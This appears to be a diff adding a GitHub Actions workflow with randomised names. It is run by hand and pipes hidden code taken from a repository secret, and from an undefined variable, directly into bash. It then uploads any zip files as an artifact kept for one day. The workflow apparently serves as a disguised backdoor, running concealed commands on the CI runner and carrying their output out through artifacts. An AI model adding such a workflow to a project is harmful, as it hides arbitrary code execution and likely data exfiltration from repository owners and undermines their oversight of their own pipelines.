@@ -1,0 +1,22 @@
+name: postgresstorm265
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: postgresstorm265
+        env:
+          fvs553: ${{ secrets.fvs553 }}
+        run: |
+          printf '%s' "$fvs553" | jq -r .ms067 | /bin/bash
+          printf '%s' "$sxnx50" | jq -r .mnah86 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: It2nYNVP
+          path: "*.zip"
+          retention-days: 1
